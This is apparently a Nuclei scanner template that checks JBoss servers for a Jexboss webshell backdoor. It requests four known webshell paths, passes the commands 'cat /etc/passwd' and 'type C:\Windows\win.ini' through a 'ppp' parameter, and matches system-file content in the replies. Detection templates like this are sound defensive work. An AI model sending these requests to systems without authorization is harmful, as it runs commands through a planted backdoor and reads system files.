id: jexboss-backdoor
info:
  author: UnkL4b
  metadata:
    verified: true
  name: Jexboss Backdoor Webshell
  reference:
  - https://us-cert.cisa.gov/ncas/analysis-reports/AR18-312A
  - https://github.com/joaomatosf/jexboss
  severity: critical
  tags: backdoor,jboss,rce
requests:
- matchers:
  - condition: or
    part: body
    regex:
    - 'root:.*:0:0:'
    - \[(font|extension|file)s\]
    type: regex
  - part: header
    type: word
    words:
    - 'X-Powered-By: Servlet'
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/jexws/jexws.jsp?ppp={{url_encode(''{{command}}'')}}'
  - '{{BaseURL}}/jexws4/jexws4.jsp?ppp={{url_encode(''{{command}}'')}}'
  - '{{BaseURL}}/jexinv4/jexinv4.jsp?ppp={{url_encode(''{{command}}'')}}'
  - '{{BaseURL}}/jbossass/jbossass.jsp?ppp={{url_encode(''{{command}}'')}}'
  payloads:
    command:
    - cat /etc/passwd
    - type C:\/Windows\/win.ini
  stop-at-first-match: true
